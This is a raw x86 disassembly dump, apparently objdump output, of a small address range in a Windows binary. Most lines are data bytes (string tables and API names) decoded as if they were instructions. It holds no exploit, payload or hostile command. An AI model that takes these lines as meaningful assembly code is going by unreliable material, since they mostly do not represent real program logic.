  423936:	inc    esp
  423937:	add    BYTE PTR [edi+0x39],dl
  42393a:	ss pop edi
  42393c:	dec    eax
  42393d:	pop    edx
  42393e:	pop    ecx
  42393f:	inc    edi
  423940:	push   ebp
  423941:	pop    edi
  423942:	push   eax
  423943:	dec    eax
  423944:	inc    ebx
  423945:	add    BYTE PTR [ebp+0x0],dl
  423948:	xor    al,0x0
  42394a:	dec    edi
  42394b:	add    BYTE PTR [edi+0x0],bl
  42394e:	cmp    BYTE PTR [eax],al
  423950:	xor    al,BYTE PTR [eax]
  423952:	inc    ebx
  423953:	add    BYTE PTR [edx+0x0],bl
  423956:	inc    ebx
  423957:	add    BYTE PTR [edi],dh
  423959:	add    BYTE PTR [edi+0x0],bl
  42395c:	inc    ebx
  42395d:	add    BYTE PTR [eax+eax*1+0x0],al
  423961:	add    BYTE PTR [eax+eax*1+0x4b],cl
  423965:	add    BYTE PTR [edx],dh
  423967:	add    BYTE PTR [edi+0x0],bl
  42396a:	cmp    BYTE PTR [eax],al
  42396c:	dec    esp
  42396d:	add    BYTE PTR [esi+0x0],dl
  423970:	pop    edi
  423971:	add    BYTE PTR [ecx+0x0],bl
  423974:	push   edx
  423975:	add    BYTE PTR [esi+0x0],dl
  423978:	xor    al,BYTE PTR [eax]
  42397a:	cmp    BYTE PTR [eax],al
  42397c:	pop    edi
  42397d:	add    BYTE PTR [edx+0x0],cl
  423980:	add    BYTE PTR [eax],al
  423982:	inc    edx
  423983:	add    BYTE PTR [eax+eax*1+0x46],cl
  423987:	add    BYTE PTR [edi+0x0],bl
  42398a:	xor    eax,DWORD PTR [eax]
  42398c:	inc    ebp
  42398d:	add    BYTE PTR [ecx+0x0],cl
  423990:	push   edx
  423991:	add    BYTE PTR [ecx],bh
  423993:	add    BYTE PTR [esi+0x0],dl
  423996:	add    BYTE PTR [eax],al
  423998:	dec    ebp
  423999:	add    BYTE PTR [edi],dh
  42399b:	add    BYTE PTR [eax+eax*1+0x5f],al
  42399f:	add    BYTE PTR [edx+0x0],cl
  4239a2:	pop    eax
  4239a3:	add    BYTE PTR [ebx],dh
  4239a5:	add    BYTE PTR [ecx],dh
  4239a7:	add    BYTE PTR [ebx+0x0],al
  4239aa:	add    BYTE PTR [eax],al
  4239ac:	dec    edi
  4239ad:	add    BYTE PTR [esi],dh
  4239af:	add    BYTE PTR [eax+0x0],cl
  4239b2:	pop    edi
  4239b3:	add    BYTE PTR [eax],dh
  4239b5:	add    BYTE PTR [edi],dh
  4239b7:	add    BYTE PTR [ecx],dh
  4239b9:	add    BYTE PTR [edx+0x0],dl
  4239bc:	xor    eax,0x55000000
  4239c1:	add    BYTE PTR [eax+eax*1+0x5a],dl
  4239c5:	add    BYTE PTR [edi+0x0],bl
  4239c8:	push   esp
  4239c9:	add    BYTE PTR [ecx+0x0],al
  4239cc:	cmp    DWORD PTR [eax],eax
  4239ce:	pop    edi
  4239cf:	add    BYTE PTR [ebx],dh
  4239d1:	add    BYTE PTR [eax],dh
  4239d3:	add    BYTE PTR [eax],bh
  4239d5:	add    BYTE PTR [edi+0x0],cl
  4239d8:	inc    ebx
  4239d9:	add    BYTE PTR ds:0x4d000000,dh
  4239df:	add    BYTE PTR [esi+0x0],cl
  4239e2:	inc    ebp
  4239e3:	add    BYTE PTR [edi+0x0],bl
  4239e6:	push   esp
  4239e7:	add    BYTE PTR [esi+0x0],al
  4239ea:	cmp    BYTE PTR [eax],al
  4239ec:	push   ebx
  4239ed:	add    BYTE PTR [edx+0x0],bl
  4239f0:	pop    edi
  4239f1:	add    BYTE PTR [eax],dh
  4239f3:	add    BYTE PTR [eax],bh
  4239f5:	add    BYTE PTR [eax+0x0],cl
  4239f8:	add    BYTE PTR [eax],al
  4239fa:	dec    esi
  4239fb:	add    BYTE PTR [edi+0x0],cl
  4239fe:	pop    edx
  4239ff:	add    BYTE PTR [edi+0x0],bl
  423a02:	add    BYTE PTR ss:[ecx+0x0],bl
  423a06:	dec    ebp
  423a07:	add    BYTE PTR [esi],dh
  423a09:	add    BYTE PTR [ebx],dh
  423a0b:	add    BYTE PTR [edi+0x0],bl
  423a0e:	xor    al,0x0
  423a10:	dec    esi
  423a11:	add    BYTE PTR [edx],dh
  423a13:	add    BYTE PTR [esi],dh
  423a15:	add    BYTE PTR [ecx],dh
  423a17:	add    BYTE PTR [eax],al
  423a19:	add    BYTE PTR [ebx+0x0],cl
  423a1c:	dec    eax
  423a1d:	add    BYTE PTR [eax],bh
  423a1f:	add    BYTE PTR [edi+0x0],bl
  423a22:	inc    esi
  423a23:	add    BYTE PTR [esi+0x0],al
  423a26:	push   esp
  423a27:	add    BYTE PTR [edi],dh
  423a29:	add    BYTE PTR [esi],dh
  423a2b:	add    BYTE PTR [edi+0x0],bl
  423a2e:	dec    esp
  423a2f:	add    BYTE PTR [ecx+0x0],bl
  423a32:	add    BYTE PTR [eax],al
  423a34:	push   ebx
  423a35:	add    BYTE PTR [ecx+0x0],bl
  423a38:	xor    BYTE PTR [eax],al
  423a3a:	pop    edi
  423a3b:	add    BYTE PTR [ecx],bh
  423a3d:	add    BYTE PTR [edx+0x0],dl
  423a40:	dec    eax
  423a41:	add    BYTE PTR [ecx+0x0],bl
  423a44:	xor    al,BYTE PTR [eax]
  423a46:	pop    edi
  423a47:	add    BYTE PTR [eax],dh
  423a49:	add    BYTE PTR [eax],al
  423a4b:	add    BYTE PTR [edx+0x0],al
  423a4e:	dec    edx
  423a4f:	add    BYTE PTR [esi+0x0],cl
  423a52:	xor    al,BYTE PTR [eax]
  423a54:	pop    edi
  423a55:	add    BYTE PTR [eax+eax*1+0x33],cl
  423a59:	add    BYTE PTR [edx+0x0],dl
  423a5c:	xor    al,0x0
  423a5e:	dec    eax
  423a5f:	add    BYTE PTR [eax],al
  423a61:	add    BYTE PTR [ebp+0x0],dl
  423a64:	add    BYTE PTR ss:[ebp+0x0],cl
  423a68:	xor    DWORD PTR [eax],eax
  423a6a:	pop    edi
  423a6b:	add    BYTE PTR [esi],dh
  423a6d:	add    BYTE PTR [ecx+0x0],bl
  423a70:	push   ebp
  423a71:	add    BYTE PTR [eax+eax*1+0x5f],dl
  423a75:	add    BYTE PTR [edi+0x0],cl
  423a78:	inc    esp
  423a79:	add    BYTE PTR [edi+0x0],dl
  423a7c:	push   ebx
  423a7d:	add    BYTE PTR [eax],al
  423a7f:	add    BYTE PTR [edx+0x0],bl
  423a82:	inc    ebx
  423a83:	add    BYTE PTR [ebp+0x0],dl
  423a86:	pop    edi
  423a87:	add    BYTE PTR [ecx],dh
  423a89:	add    BYTE PTR [ebp+0x0],al
  423a8c:	push   esp
  423a8d:	add    BYTE PTR [eax],dh
  423a8f:	add    BYTE PTR [eax],al
  423a91:	add    BYTE PTR [eax],al
  423a93:	add    BYTE PTR [eax],al
  423a95:	add    BYTE PTR [eax-0x7ffbffbe],al
  423a9b:	inc    edx
  423a9c:	add    BYTE PTR [eax],cl
  423a9e:	add    BYTE PTR [edx+0x0],0xc
  423aa2:	add    BYTE PTR [edx+0x0],0x10
  423aa6:	add    BYTE PTR [edx+0x0],0x14
  423aaa:	add    BYTE PTR [edx+0x0],0x18
  423aae:	add    BYTE PTR [edx+0x0],0x1c
  423ab2:	add    BYTE PTR [edx+0x0],0x20
  423ab6:	add    BYTE PTR [edx+0x0],0x24
  423aba:	add    BYTE PTR [edx+0x0],0x28
  423abe:	add    BYTE PTR [edx+0x0],0x0
	...
  423ad2:	add    BYTE PTR [eax],al
  423ad4:	sbb    edi,DWORD PTR [edi+0x4d57]
  423ada:	add    BYTE PTR [eax],al
  423adc:	add    bh,BYTE PTR [ebx]
  423ade:	add    al,BYTE PTR [eax]
  423ae0:	add    DWORD PTR [eax],eax
  423ae2:	add    BYTE PTR [eax],al
  423ae4:	add    DWORD PTR [eax],eax
  423ae6:	add    BYTE PTR [eax],al
  423ae8:	add    DWORD PTR [eax],eax
  423aea:	add    BYTE PTR [eax],al
  423aec:	clc    
  423aed:	cmp    al,BYTE PTR [edx]
  423aef:	add    ah,bh
  423af1:	cmp    al,BYTE PTR [edx]
  423af3:	add    BYTE PTR [eax],al
  423af5:	cmp    eax,DWORD PTR [edx]
  423af7:	add    BYTE PTR [esi-0x31],al
  423afa:	add    BYTE PTR [eax],al
  423afc:	push   cs
  423afd:	cmp    eax,DWORD PTR [edx]
  423aff:	add    BYTE PTR [eax],al
  423b01:	add    BYTE PTR [edi+0x6f],dl
  423b04:	jb     0x423b6a
  423b06:	push   edi
  423b07:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  423b0e:	aas    
  423b0f:	inc    ebp
  423b10:	outs   dx,BYTE PTR ds:[esi]
  423b11:	jne    0x423b80
  423b13:	push   edi
  423b14:	imul   ebp,DWORD PTR [esi+0x64],0x7453776f
  423b1b:	popa   
  423b1c:	je     0x423b87
  423b1e:	outs   dx,DWORD PTR ds:[esi]
  423b1f:	outs   dx,BYTE PTR ds:[esi]
  423b20:	jae    0x423b75
  423b22:	je     0x423b85
  423b24:	.byte 0x74
